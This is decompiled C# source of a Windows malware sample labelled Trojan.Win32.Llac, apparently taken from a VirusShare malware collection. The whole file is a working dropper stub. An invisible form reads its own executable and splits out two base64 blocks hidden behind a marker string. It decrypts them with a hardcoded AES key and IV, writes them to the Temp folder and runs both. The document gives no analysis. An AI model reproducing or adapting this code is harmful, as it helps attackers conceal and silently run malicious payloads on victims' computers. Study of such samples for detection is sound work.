﻿// Decompiled with JetBrains decompiler
// Type: st7fa8453sdfsdfsd.Form1
// Assembly: asdf345245egsdsdffgr46, Version=1.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EEEFB942-1A23-4D1E-9820-945A833A0EC9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Llac.aetd-67650359f14e4a8397f4b3801b3f4d385ad932c3ce95dbd6f6edd75522605768.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using st7fa8453sdfsdfsd.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace st7fa8453sdfsdfsd
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ResumeLayout(false);
    }

    public byte[] Unsecure(byte[] data)
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.IV = new byte[16]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 9,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7
        };
        rijndaelManaged.Key = new byte[16]
        {
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1,
          (byte) 9,
          (byte) 8,
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1
        };
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        string temp = MyProject.Computer.FileSystem.SpecialDirectories.Temp;
        string[] strArray = Strings.Split(File.ReadAllText(Application.ExecutablePath), "dakhVAqvryJa7r21r9Dr");
        byte[] data1 = this.Unsecure(Convert.FromBase64String(strArray[1]));
        byte[] data2 = this.Unsecure(Convert.FromBase64String(strArray[3]));
        MyProject.Computer.FileSystem.WriteAllBytes(temp + "\\" + strArray[2], data1, false);
        MyProject.Computer.FileSystem.WriteAllBytes(temp + "\\" + strArray[4], data2, false);
        Process.Start(temp + "\\" + strArray[2]);
        Process.Start(temp + "\\" + strArray[4]);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Process.GetCurrentProcess().Kill();
        ProjectData.ClearProjectError();
      }
      Process.GetCurrentProcess().Kill();
    }
  }
}